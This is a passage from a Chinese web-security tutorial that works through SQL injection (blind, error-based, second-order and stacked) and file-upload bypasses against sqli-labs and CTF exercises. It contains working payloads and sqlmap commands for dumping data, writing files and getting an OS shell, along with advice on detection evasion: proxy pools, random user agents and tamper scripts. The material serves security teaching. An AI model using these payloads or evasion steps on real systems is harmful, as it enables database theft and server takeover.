接受 IP 的绕过（只有 php 才有 xff 头可以改 ip）\n\n实现：代码配置固定 IP 去判断-策略绕过\n实现：数据库白名单 IP 去判断-select 注入\n实现：防注入记录 IP 去保存数据库-insert 注入\n\n\n3.文件上传将文件名写入数据库-insert 注入\n\n\n\n3.数据库请求格式\n\n1.数据采用统一格式传输，后端进行格式解析带入数据库（json）\n2.数据库采用加密编码传输，后端进行解密解码带入数据库（base64）\n\n4.文件头注入-非常规注入语句\n\n同样，如果它有这样的需求，有插入像图片、音频这样的文件\n并且在后端会将文件名这些东西保存到数据库里，那就可能会导致注入\n这里引出的内容就是 SQL 注入不止是 SELECT 查询注入，像 INSERT、UPDATE、DELETE 这些也存在注入\n这些应该会在之后的课程中讲到，这里只需要知道有这些注入方式即可\n参考文章：利用 insert、update 和 delete 注入获得数据  https://www.cnblogs.com/babers/articles/7252401.html\n\n5.XFF 头绕过-绕过 ip 检测\n\n\nX-Forwarded-For是一个 HTTP 扩展头部，用于标识通过代理服务器连接到 Web 服务器的客户端的原始 IP 地址。它最初由 Squid 缓存代理软件引入，现在已成为事实上的标准，被广泛应用于 HTTP 代理、负载均衡等转发服务，并被写入 RFC 7239（Forwarded HTTP Extension）标准。\n\n\n这个东西是一个记录 IP 的参数，假设开发者需要记录用户的登录 IP，然后判断这个 IP 是不是属于内网地址啊，如果是内网地址才让登录，不是就不让登录； 或者就仅仅是记录一下 IP 等等。\n\n\n如果是后者，那么是不是就是我们上面讲的非常规的注入点之一啊？\n\n\n如果是前者，那么我们就可以通过伪造 XFF 头尝试绕过检测，进行 SQL 注入\n\n\n我们通过 sqli-libs 来进行演示，我们找到第 11 关的源码，然后在登录判断前添加如下代码：\n1234567891011121314151617181920212223242526272829303132function getClientIp() &#123;      if (getenv(&#x27;HTTP_CLIENT_IP&#x27;) &amp;&amp; strcasecmp(getenv(&#x27;HTTP_CLIENT_IP&#x27;), &#x27;unknown&#x27;)) &#123;          $ip = getenv(&#x27;HTTP_CLIENT_IP&#x27;);      &#125; elseif (getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;) &amp;&amp; strcasecmp(getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;), &#x27;unknown&#x27;)) &#123;          $ip = getenv(&#x27;HTTP_X_FORWARDED_FOR&#x27;);          $ips = explode(&#x27;,&#x27;, $ip);          $ip = $ips[0];      &#125; elseif (getenv(&#x27;REMOTE_ADDR&#x27;) &amp;&amp; strcasecmp(getenv(&#x27;REMOTE_ADDR&#x27;), &#x27;unknown&#x27;)) &#123;          $ip = getenv(&#x27;REMOTE_ADDR&#x27;);      &#125; elseif (isset($_SERVER[&#x27;REMOTE_ADDR&#x27;]) &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] &amp;&amp; strcasecmp($_SERVER[&#x27;REMOTE_ADDR&#x27;], &#x27;unknown&#x27;)) &#123;          $ip = $_SERVER[&#x27;REMOTE_ADDR&#x27;];      &#125; else &#123;          $ip = &#x27;unknown&#x27;;      &#125;      return $ip;  &#125;$ip = getClientIp();  // 只有当ip为192.168.0.1访问时，允许登录if ($ip ** &quot;192.168.0.1&quot;) &#123;      if($row)      &#123;  \t    // 原本正确输出代码    &#125;      else      &#123;          // 原本错误输出代码    &#125;  &#125; else &#123;      echo &quot;&lt;h1&gt;禁止访问！&lt;/h1&gt;&quot;;  &#125;\n\n\n什么意思呢？就是我在登录时需要判断用户的登录 IP，这个 IP 值我从 HTTP_CLIENT_IP 或 HTTP_X_FORWARDED_FOR 等这些地方得到，然后 IP 值为 192.168.0.1 时我才允许登录\n\n\n三、盲注\n\n盲注就是在注入过程中，获取的数据 不能回显至前端页面。我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注\n\n1.增删改查\n\n数据查询\n\nSELECT *FROM news where id = $id\n\n\n新增用户，添加新闻等\n\nINSERT INTO news (字段名) VALUES (数据)\n\n\n删除用户，删除新闻等\n\nDELETE FROM news WHERE id =$id\n\n\n修改用户，修改文章等\n\nUPDATE news SET id =$id\n\n\n\n2.布尔盲注-逻辑判断\n\n\n所谓布尔盲注，布尔是 True 和 False 的意思，就是页面有两种状态，如果我们输入正确的数值就正常（正常回显数据），输入错误的数值就异常（比如某一部分显示空白）\n\n\n那此时就说明页面有两种状态，那么我们就可以基于 页面的状态判断 我们注入的 SQL 语句是否正确执行\n\n\n条件：要有可以判断的 bool 回显\n\nregexp, like, ascii, left, ord, mid\n\n\n\n注入过程：\n123456789101112# 布尔盲注1. and length(database()) = 7;   # 判断数据库名长度是否为72. and left(database(), 1) = &#x27;p&#x27;;  # 判断数据库名前1位字符是否为p3. and left(database(), 2) = &#x27;pi&#x27;; # 判断数据库名前2位字符是否为pi4. and substr(database(), 2, 1) = &#x27;i&#x27;;  # 判断数据库名从第2位开始后面长度为1（第3位）的字符是否为i5. and ord(left(database(), 1)) = 112; # 判断数据库名前1位字符转为ascii码之后是否等于112，用于绕过引号检测6. and asscii(substr(database(), 1, 1)) &gt; 97; # 判断数据库名第1位字符转为asscii码之后是否大于97，同样用于绕过\n\n\n以 Sqli-labs 第 8 关作为演示案例，当我们输入 id = 1 时，显示一个页面：\n\n\n\n当我们输入 id = 1' 时，显示另一个画面：\n\n\n\n可以很明显的看到下面的 You are in....... 不见了，那这时就可以使用布尔注入去猜数据\n\n\n那这里我们就可以使用上面的语句尝试猜测一下它的数据库名，payload 为：1' and length(database()) = 7 --+：\n\n\n\n回显错误页面，说明长度，改成 8：\n\n\n\n回显出正确页面，说明数据库名长度等于 8，然后我们就可以进一步猜测数据库名的每个字符等等，这个一般都用脚本或工具来跑，手注太慢了\n\n\n相关资料：https://blog.csdn.net/wangyuxiang946/article/details/123486880\n\n\n3.时间盲注- 延时判断\n\n\n时间盲注，也称延时注入，一般是 if 条件语句搭配 sleep() 函数使用，通过条件的正确与否导致页面产生不同程度的延迟来实现注入\n\n\n它在实战中经常用来 判断某个地方是否存在 SQL 注入；同时 当页面没有任何回显/变化时，可以通过它来实现注入\n\n\n注入过程\n1231. and sleep(1); # 休眠1s2. and if(length(database()) = 7, sleep(1), 0); # 如果数据库名长度等于7，休眠1s，否则等于0\n\n\n这里以 Sqli-labs 第 9 关进行演示，这里是单引号闭合方式，输入 id=1：\n\n\n\n然后输入 id=1' 尝试让其闭合报错：\n\n\n\n可以看到没有任何反应，页面也没啥变化，你甚至可能都不确定这到底是不是个注入点\n\n\n那么此时就可以使用延时注入来判断一下，这里输入 id=1' or if(1, sleep(2), sleep(0)) --+，然后抓包看一下是否会成功延时 3 秒：\n\n\n\n可以看到确实延迟了 2s，说明我们这个语句成功执行了，那么我们就可以使用上面的语句进行注入了，比如判断数据库名的长度等等，这里就不再演示\n\n\n相关资料：https://blog.csdn.net/wangyuxiang946/article/details/123857045\n\n\n4.报错注入-报错回显\n\n\n其实这个也算是有回显的注入类型了，所谓报错注入就是，开发者人员为了方便调试，会将 SQL 语句执行错误后的报错信息输出到前端页面当中\n\n\n试用情况：页面有数据库的报错信息：\n\n报错信息必须是动态的，来自数据库的报错信息\n网站是写死的、自定义的报错不算\n\n\n\n一般在 php 中是这段代码：\n\n\n1die(mysqli_error($conn));\n\n\n如果代码审计中看到这个东西，那就可以尝试报错注入\n\n\n注入过程：\n1234567891011121314?id=-1&#x27; and updatexml(1,&#x27;~&#x27;,3) #检查报错信息是否正常回显?id=-1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(schema_name)from information_schema.schemata), 1 , 31)),3)   #获取所有数据库?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(table_name) from information_schema.tables where table_schema = &#x27;security&#x27;), 1 , 31)),3)    #获取所有表名?id=1&#x27; and updatexml(1,concat(&#x27;~&#x27;,substr( (select group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;), 1 , 31)),3) #获取所有字段?id=1&#x27;and updatexml(1, concat(0x7e, (SELECT version(), 0x7e)), 1);  # 报错回显出当前MySQL版本号?id=1 and extractvalue(1, concat(0x5c, (SELECT table_name from information_schema.tables limit 1))); #报错回显出当前第一行表名\n\n\n原理：upadatexml 函数，当第二个参数包含特殊符号时如 0x7e 就会报错成 ~，并将第二个参数的内容显示在报错信息中\n\n\nconcat：拼接特殊符号个查询结果\n\n\n长度限制：updatexml() 函数的报错内容长度不能超过 32 个字符，常用的解决方式有两种：\n\nlimit 分页\nsubstr()截取字符\n\n123456?id=-1&#x27; and updatexml(1,concat(0x7e,(select userfrom mysql.user limit 1,1)),3)  #linmit，limit(0,1)展示第0条数据，limit(1,1)展示第一条数据?id=-1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user)from mysql.user), 1 , 31)),3)#substr(),从第一个字符截取到31个字符\n\n\n这里同样以 Sqli-labs 第 1 关为例，我们可以看看代码是怎么写的：\n123456789101112131415161718192021222324252627if(isset($_GET[&#x27;id&#x27;]))  &#123;      $id=$_GET[&#x27;id&#x27;];  //logging the connection parameters to a file for analysis.      $fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);      fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);      fclose($fp);    // connectivity         $sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;      $result=mysql_query($sql);      $row = mysql_fetch_array($result);        if($row)      &#123;          // 显示正常页面    &#125;      else      &#123;          echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;          print_r(mysql_error());    // 最主要就是加了一句这个代码！        echo &quot;&lt;/font&gt;&quot;;      &#125;  &#125;  else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;\n\n\n我们输入 id=1，正常回显：\n\n\n\n当我们输入 id=1' 时，就会产生 SQL 语句报错：\n\n\n\n那此时就可以使用报错注入，比如输入 payload 为 id=1' and updatexml(1,concat(0x7e, database(), 0x7e),1) --+：\n\n\n\n就成功爆出数据库名了，接下来就和 union select 差不多的步骤，通过 information_schema 爆出其他数据\n\n\n相关资料：https://blog.csdn.net/wangyuxiang946/article/details/123416521\n\n\n5.注入条件-数据回显&amp;错误处理\n\n\n基于延时：都不需要\n1and if(1, sleep(5), 0);\n\n\n基于布尔：有数据库输出判断标准\n1and length(database()) = 6;\n\n\n基于报错：有数据库报错处理判断标准\n1and updatexml(1,concat(0x7e, (SELECT version(), 0x7e), 1))\n\n\n测试 delete 注入：（有无回显，有无报错）\n\n延迟：1 or if (1, sleep(5), 0)\n布尔：3 and length(database())= 6（无回显，无法判断注入）\n报错：4 and updatexml(1, concat(0x7e, (SELECT version(), 0x7e), 1))\n\n\n\n四、进阶注入\n1.二次注入\n\n什么是二次注入，其实很简单，它满足的条件就是 先插后取 **&gt; 先执行插入操作，再执行查询/更新操作\n简单来说就是，数据库会先插入我们恶意的 SQL 语句，但在 当前的功能点这个恶意 SQL 语句是不执行的；我们可以通过另外一个地方去尝试让 服务器自己调用 这个恶意 SQL 语句，达到注入的效果\n那你会问，插入时 SQL 语句都不执行，后面为什么会执行呢？、\n\n这里就是二次注入的 关键点：它 需要在执行插入语句的时候将我们代码中的引号这些转义掉\n而在数据库中插入数据时出现转义符会将转义符去掉，然后将全部字符当作字符串处理，就不会导致提前闭合\n\n\n\n\n\n\n这里用 Sqli-labs 第 24 关演示一下\n\n\n假设我们知道用户名是 admin，但是不知道密码是多少\n\n\n\n首先尝试一下 万能密码 admin' or 1=1 #：\n\n\n\n登录失败，提示我是个愚蠢的黑客，说明有过滤，看一看源码 login.php：\n12345678910111213$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);  $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);  $sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;  //$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;  $res = mysql_query($sql) or die(&#x27;You tried to be real smart, Try harder!!!! :( &#x27;);  $row = mysql_fetch_row($res);  //print_r($row) ;  if ($row[1]) &#123;      return $row[1];  &#125; else &#123;      return 0;  &#125;\n\n\n可以看到使用了 mysql_real_escape_string() 函数，这个函数就是用来转义我们的输入的引号，他会转义成 \\' 或者 \\&quot;，所以我们无法注入\n\n\n我们看到他有修改密码的选项，我们看能不能试着修改 admin 的密码，发现这里点不了：\n\n\n\n看一看源码，有什么触发条件：\n123456789101112131415161718// 从SESSION中取出&quot;username&quot;$username= $_SESSION[&quot;username&quot;];  $curr_pass= mysql_real_escape_string($_POST[&#x27;current_password&#x27;]);  $pass= mysql_real_escape_string($_POST[&#x27;password&#x27;]);  $re_pass= mysql_real_escape_string($_POST[&#x27;re_password&#x27;]);    if($pass**$re_pass)  &#123;  \t// 更新密码！    $sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;      $res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);      // 其他代码&#125;  else  &#123;      // 其他代码&#125;  \n\n\n他需要有 SESSION 值才行，说明要先登录，然后我们看到他下面有一个更新数据的 SQL 语句\n\n\n这里有一个很 重要 的点就是：他不是我们输入 username 的方式去接收该参数的\n\n\n也就是说这里他不会对 username 的值做任何转义操作，所以假设我的用户名是 admin' #，那么他的更新语句就会变成：\n1UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27; # &#x27; and password=&#x27;admin123&#x27;;\n\n\n那么实际执行的 SQL 语句就是 UPDATE users SET PASSWORD='123456' where username='admin'，将 admin 用户的密码更改为了 123456，那我们就可以直接登录了\n\n\n好，现在思路有了，我们就找一找哪里能够让我们的 SESSION 中 username 为 admin' #\n\n\n那这里刚好有注册按钮，又看一看注册用户的源码 login_create.php：\n123456789101112131415161718192021222324252627282930313233// 判断用户名是否已存在$username=  mysql_escape_string($_POST[&#x27;username&#x27;]) ;  $pass= mysql_escape_string($_POST[&#x27;password&#x27;]);  $re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);    echo &quot;&lt;font size=&#x27;3&#x27; color=&#x27;#FFFF00&#x27;&gt;&quot;;  // 查询用户名是否已存在$sql = &quot;select count(*) from users where username=&#x27;$username&#x27;&quot;;  $res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;);  $row = mysql_fetch_row($res);// 如果用户名已存在if (!$row[0]** 0)  &#123;      // 不重要的代码&#125;  // 如果用户名不存在 **&gt; 重要的点在这里else  &#123;      if ($pass**$re_pass)      &#123;  \t    // 更新数据SQL语句！        $sql = &quot;insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;)&quot;;          // 其他代码    &#125;      else      &#123;  \t    // 其他代码    &#125;  &#125;\n\n\n可以看到这里仍然有转义语句，所以也没办法注入，但是这也说明了我可以注册带有特殊字符的名字\n\n\n所以我们注册用户 admin' #，密码为 123456\n\n\n\n那么我们再利用这个账号登录，让 username 存入 SESSION 中，然后修改密码，不就可以实现我们的设想了吗？\n\n\n\n\n好，现在成功登录，然后我们修改密码为 12345：\n\n\n\n这时候按我们的推测应该是修改的 admin 的密码，那直接登录一下：\n\n\n\n成功登录， 当然了，这里因为他有 die() 函数，那么你是不是可以尝试报错注入啊，把用户名修改成 aa' and updatexml(1,concat(0x7e,(select version()),0x7e),3) # 看一看，但是这里他 限制了用户名长度，所以 pass\n\n\n总的来说，如果要形成二次注入，需要满足以下条件：\n\n业务逻辑中数据是 先插后取 的\n数据插入时有 转义函数（mysql_escape_string()、addslashes()）\n后续 查询/更新 其他数据需要用到插入的数据\n\n\n\n可以看到二次注入需要满足的条件还是很苛刻的，所以实战中很少用到，需要测试的点太多了\n\n\n测试思路：\n\n黑盒测试：分析功能有添加后对数据操作的地方（功能点）\n白盒测试：insert 后进入 select 或 updata 的功能的代码块\n\n\n\n2.堆叠注入\n\n\n堆叠注入，也很简单，就是 能够同时执行多条恶意 SQL 语句，每条语句使用 ; 隔开\n\n\n原理很简单，但是实战中很难碰到，因为他的触发条件也比较苛刻，需要满足以下条件：\n\n目标 存在 SQL 注入 漏洞\n目标 不能过滤分号（;）\n目标中间层查询数据库信息时 可以同时执行多条 SQL 语句\n使用的 数据库支持堆叠注入（MySQL、MSSQL、Postgresql 等）\n\n\n\n在 php 中，需要有 mysqli_multi_query() 函数\n\n\n所以实战中基本碰不到，但 CTF 可能会碰到，如果不打 CTF，那了解原理即可\n\n\n实战案列：BUUCTF 中的 [强网杯 2019 随便注]\n\n\n\n判断是字符型还是数字型，输入 1' 会产生报错：\n\n\n判断闭合符为单引号，这里就不尝试其他的注入方法了，直接堆叠注入，payload 为 ';show databases;#“：\n\n\n\n出库名了，然后看一下 show tables 表名：\n\n\n\n然后尝试 select * from 191xxx 读取第一个表的值：\n\n\n\n提示不让用 select，那就尝试绕过吧，这里绕过语句为 1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#\n\n\n成功拿到 flag\n\n\npayload 的由来可以看：https://blog.csdn.net/m0_73734159/article/details/134049744\n\n\n五、SQLMAP 的使用\n\nsqlmap 是一款开源的渗透测试工具，可以 自动化 进行 SQL 注入 的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎, 为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。\n详细资料：https://www.cnblogs.com/bmjoker/p/9326258.html\n\n1.基础语句\n1python sqlmap.py -u &quot;http://xxx&quot;\n2.判断当前数据库的信息\n123--current-user : 查看当前数据库用户--privileges : 查看当前用户权限--is-dba : 查看当前用户是否为管理员\n3.获取数据库的敏感信息\n12345--current-db : 获取当前数据库名称--tables : 获取所有数据库下的所有表名--tables -D &quot;&quot; : 获取指定数据库名下的表名--columns -T &quot;&quot; -D &quot;&quot; : 获取指定数据库名下，指定表名下的列名--dump -C &quot;&quot; -T &quot;&quot; -D &quot;&quot; : 获取指定数据库名下，指定表名下，指定列名下的数据\n4.文件读取\n12--file-read &quot;&quot; : 读取目标文件--file-write &quot;&quot; --file-dest &quot;&quot; : 将本地文件写入服务器目标文件\n\n\n这里需要满足的条件：\n\n网站必须是 root 权限\n具有读写权限（比如 mysql 需要关闭 secure_file_priv）\n需要知道网站的绝对路径\n\n\n\n比如使用 --file-read 读取 D:\\\\1.txt 文件：\n\n\n\n这里它就帮我们下载好了放到了  C:\\用户\\用户名\\AppData\\Local\\sqlmap\\output\\sqli.labs\\files\\D__1.txt 下，直接查看：\n\n\n\n然后我们尝试使用 --file-write 和 --file-dest 上传一个文件到目标服务器：\n1python sqlmap.py -u &quot;http://sqli.labs:8889/Less-1/?id=1&quot; --file-write &quot;D:\\\\1.txt&quot; --file-dest &quot;D:\\\\phpstudy_pro\\\\WWW\\\\sqli-labs\\\\1.txt&quot;\n\n\n\n最后没有 [WARNING] 这种局警告就算上传成功\n\n\n5.命令执行\n1231. --sql-shell : 执行sql命令2. --os-cmd=xx : 执行指定cmd命令3. --os-shell : 系统交互命令\n\n\n这里如果是 mysql、postgresql、microsoft sql server，优势可以直接获取权限执行任意命令\n\n\n需要满足的条件：\n\n网站必须是 root 权限\n攻击者需要知道网站的绝对路径\nGPC 为 off , php 主动转义的功能关闭\n\n\n\n比如执行 sql 命令，直接获取 users 表的所有信息：\n\n\n\n还有可以尝试能不能执行主机 cmd 命令，比如执行 --os-cmd=calc：\n\n\n\n中途会问你网站使用的是哪种开发语言，默认为 ASP，我们选择 PHP：\n\n\n\n因为执行目标指令，其实就相当于上传一个后门文件，所以 需要知道当前网站的根目录，因此它会问你是否尝试披露网站的完整路径，一律回车即可：\n\n\n\n这里它没有成功弄出路径，然后我们这里选 2 手动指定一下它的根目录：\n\n\n\n\n这里可以看到它已经成功上传了后门到指定的根目录，回车：\n\n\n\n成功弹出计算器，需要注意，这里 最好是把杀软关掉\n\n\n同理，也可以直接执行 --os-shell 尝试直接拿到主机权限：\n\n\n\n6.提交方式\n1234--data &quot;&quot; : 通过POST发送数据--cookie &quot;&quot; : cookie注入-r &quot;&quot; : 通过数据包注入* : 标记需要注入的参数位置\n\n\n除了 --data，我们还可以直接抓包整个请求体，然后通过 * 标记需要注入的位置，来处理 POST 注入：\n123456789101112131415POST /Less-11/ HTTP/1.1Host: sqli.labs:8889Content-Length: 30Cache-Control: max-age=0Origin: http://sqli.labs:8889Content-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://sqli.labs:8889/Less-11/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: closeuname=1*&amp;passwd=1*&amp;submit=Submit\n\n\n然后将这个数据包保存到一个 .txt 文件中，使用 -r 注入：\n1python sqlmap.py -r &quot;D:\\\\1.txt&quot; --dbs\n\n\n7.绕过方法\n12--tamper=xxx.py : 使用指定的脚本--tamper=1.py,2.py... : 批量使用脚本\n\n\n有些网站传递的参数可能是经过编码或者加密过的，而 Sqlmap 的 payload 是没有编码或者加密的，那这时我们再通过刚刚的注入是无法注入的\n\n\n这时候我们就需要使用一些脚本工具对 Sqlmap 的 payload 进行一些处理\n\n\n在 sqlmap/tamper/ 目录下有一些常用的 py 脚本处理 payload，比如进行 Base64 编码、二进制编码、转为小写等等\n\n\n这里以 Sqli-labs 第一关为例，我们对源代码进行一些处理，修改为如下代码：\n12$id=$_GET[&#x27;id&#x27;];$id=base64_decode($id);\n\n\n现在需要输入 id 为 base64 编码后的结果才能正常解析：\n\n\n此时我们使用 Sqlmap 正常注入肯定是不行的，可以自己下去尝试；我们这里指定脚本为自带的 base64encode.py：\n1python sqlmap.py -u &quot;http://sqli.labs:8889/Less-1/?id=MQ**&quot; --tamper=base64encode --dbs\n\n\n成功绕过注入\n\n\n现在，我们再修改一下源代码，将 base64_decode 去掉，添加过滤机制：\n12345678910111213$id=$_GET[&#x27;id&#x27;];$id = str_replace(&quot;select&quot;, &quot;&quot;, $id);$id = str_replace(&quot;SELECT&quot;, &quot;&quot;, $id);$id = str_replace(&quot;sleep&quot;, &quot;&quot;, $id);$id = str_replace(&quot;SLEEP&quot;, &quot;&quot;, $id);$id = str_replace(&quot;elt&quot;, &quot;&quot;, $id);$id = str_replace(&quot;ELT&quot;, &quot;&quot;, $id);$id = str_replace(&quot;and&quot;, &quot;&quot;, $id);$id = str_replace(&quot;AND&quot;, &quot;&quot;, $id);$id = str_replace(&quot;or&quot;, &quot;&quot;, $id);$id = str_replace(&quot;OR&quot;, &quot;&quot;, $id);$id = str_replace(&quot;xor&quot;, &quot;&quot;, $id);$id = str_replace(&quot;XOR&quot;, &quot;&quot;, $id);\n\n\n这里我们将敏感关键字大小写全部替换为空字符，然后 清除刚才的缓存，再使用 Sqlmap 跑一遍：\n\n\n发现是跑不出来东西的，假设我们手工注入已经知道了他的一个绕过方式，可以使用双写或者大小写绕过，这时候我们就可以自己编写 Tamper 脚本来处理 payload\n\n\n比如这里我就采用大小写绕过，首先复制一个原本的 tamper 脚本文件，将注释删除：\n123456789#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):    return payload\n\n\n然后在 tamper() 函数中写入我们的绕过规则，这里使用 str.replace() 函数替换 payload 中的敏感关键字：\n123456789101112131415161718192021#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies():    passdef tamper(payload, **kwargs):      if payload:          payload = payload.replace(&quot;select&quot;, &quot;SelEct&quot;)          payload = payload.replace(&quot;SELECT&quot;, &quot;SelEct&quot;)          payload = payload.replace(&quot;or&quot;, &quot;Or&quot;)          payload = payload.replace(&quot;OR&quot;, &quot;Or&quot;)          payload = payload.replace(&quot;and&quot;, &quot;And&quot;)          payload = payload.replace(&quot;AND&quot;, &quot;And&quot;)          payload = payload.replace(&quot;xor&quot;, &quot;XoR&quot;)          payload = payload.replace(&quot;XOR&quot;, &quot;XoR&quot;)          payload = payload.replace(&quot;elt&quot;, &quot;Elt&quot;)          payload = payload.replace(&quot;ELT&quot;, &quot;Elt&quot;)        return payload\n\n\n保存为 bypass.py 文件，然后再执行刚刚的命令：\n1python sqlmap.py -u &quot;http://sqli.labs:8889/Less-1/?id=MQ**&quot; --tamper=bypass --dbs\n\n\n成功爆出库名\n\n\n8.扩展分析\n\n\n调试分析\n123456781. -v [0-6] : 输出注入详细页面\t0：只显示Python的回溯，错误和关键消息。\t1：显示信息和警告消息。\t2：显示调试消息。\t3：有效载荷注入。\t4：显示HTTP请求。\t5：显示HTTP响应头。\t6：显示HTTP响应页面的内容\n\n\n当我们需要进行调试分析的时候，可以使用 -v 参数让 Sqlmap 输出详细的注入内容，方便我们查看其注入时使用的 payload、请求头信息等等\n\n\n便于我们进行调试，等级分为 0-6 级，一般取 4-5 即可\n\n\n9.代理注入\n1--proxy &quot;&quot;: 使用指定的代理进行注入测试\n\n\n这个代理有两个用途，一个是指定代理为本地某个端口，然后使用 BP 进行抓包，分析 Sqlmap 的注入数据包\n1python sqlmap.py -u &quot;xxx&quot; --proxy &quot;http://127.0.0.1:8080&quot; --dbs\n\n\n第二个用途是使用指定的代理池去进行注入，一是为了隐匿自己的真实 IP，二是当网站限制了同一 IP 请求次数时，可以不受影响\n1python sqlmap.py -u &quot;xxx&quot; --proxy &quot;代理池接口&quot; --dbs\n\n\n代理池的配置文章：https://blog.csdn.net/qq_45533926/article/details/103991470\n\n\n10.指纹伪造\n1231. --user-agent &quot;&quot; : 自定义UA头2. --random-agent : 随机UA头3. --time-sec=n : 延迟响应，默认为5\n\n\n通常，修改 UA 头是为了应对两种情况，一种是上面说到的防止 Sqlmap 默认的 UA 头无法访问某些网站，那我们就要自定义 UA 头\n1python sqlmap.py -u &quot;xxx&quot; --user-agent &quot;xxx&quot;\n\n\n第二种是 Sqlmap 的 UA 头一般为自己的信息和版本号，所以这也是它的一个 强特征，在蓝队防守的时候可以通过看 UA 头判断是否为工具攻击，为了避免这种情况，我们就需要 采用随机 UA 头\n1python sqlmap.py -u &quot;xxx&quot; --random-agent\n\n\n最后，如果网站限制了请求的速度，那么我们可以通过 --time-sec=n 进行延迟响应\n1python sqlmap.py -u &quot;xxx&quot; --time-sec=5\n\n\n11.深度测试\n12345678910111. --level=[1-5] : 指定Sqlmap执行测试的水平等级，默认为1\t1：默认等级，会测试GET和POST请求中的参数\t2：增加检测Cookie中的数据\t3：增加检测User-Agent和Referer中的数据\t4~5：增加尝试各种payload和边界条件，确保不放过任何潜在的注入点2. --risk=[1-3] : 执行Sqlmap执行测试的风险等级，默认为1\t1：默认等级，风险几乎为零\t2：增加时间盲注\t3：增加OR类型的布尔盲注，可能导致数据库记录被更改，谨慎使用\n\n用处：\n\nlevel：解决 “测哪里” 的问题，用于扩大攻击面（广度）\nrisk：解决 “怎么测” 的问题，用于增强攻击力（深度）\n\n\nlevel 等级越高，Sqlmap 就会自己去尝试注入其他的注入点，比如 UA 头、Cookie 等等，这样做会显著提高请求的数据量，容易被拦截\nrisk 等级越高，Sqlmap 就会尝试一些非常规、复杂，甚至破坏性的注入语句，比如使用 INSERT、DROP、UPDATE 注入语句，这样做可能造成数据库被破坏，容易进局子\n\n文件上传\n一、常规文件上传测试\n1.前端验证\n\n如何判断前端验证？\n\n看页面的响应速度：前端验证快、后端验证慢\nF12 查看前端代码：检查是否有校验的 JS 代码\n抓包：前端校验无法抓包、后端校验可以抓包\n\n\n绕过前端验证的三种方式\n\n禁用 JS 代码：通过插件 ModHeader 禁止页面加载 JS 代码\n抓包更改后缀：将 php 文件后缀改为允许上传的文件后缀，通过 BP 更改为 php 后缀\n本地搭建环境：根据其前端代码本地搭建环境，删去 JS 校验代码\n\n\n\n2. htaccess 配置文件\n\n配置文件（.htaccess）可以更改服务器对文件的解析规则，如果服务器为 Apache 且允许我们上传.htaccess 文件，那么我们可以利用这一点造成文件上传漏洞\n\n123&lt;IfModule mime_module&gt;\tAddHandler application/x-httpd-php .jpg&lt;/IfModule&gt;\n\n上述代码会将上传的.jpg 后缀文件解析成 php 文件\n\n3.MIME 绕过\n\n\n媒体类型（MIME），它用来表示文档、文件或字节流的性质个格式，它的通用结构为 type/subtype，对大小写不敏感，但传统都是小写。当其后端对此校验时，我们需要更改 MIME 进行绕过。\n\n\n检测机制，例如：\n123if (!in_array($_FILES[&#x27;file&#x27;][&#x27;type&#x27;], [&quot;image/jpeg&quot;, &quot;image/png&quot;, &quot;image/gif&quot;, &quot;image/jpg&quot;])) &#123;    echo &quot;&lt;script&gt;black();&lt;/script&gt;&quot;;&#125;\n\n\n绕过方式：\n\n可以先上传一个正确后缀名的文件，然后抓包，这是他的 mime 就是能通过检测机制的了，所以我们直接将名字改为 php 后缀即可\n\n\n\n4.文件头绕过\n\n\n判断一个文件类型的方式：后缀名、解析方式、MIME 类型。但是这些东西说改就改，非常不靠谱，最靠谱的方式就是检测文件内容。 但是文件内容太长了怎么检测呢？人们规定一个文件开头的几个字节信息作为文件类型信息，检测文件类型时只需要检测前几个字节即可。\n\n\n常见文件头标志如下：\n123456789101112131415JPEG（jpg）：FFD8FFPNG（png）：89504E47GIF（gif）：47494638HTML（html）：68746D6C3EZIP（zip）：504B0304RAR（rar）：52617221Adobe Acrobat（pdf）：255044462D312EMS 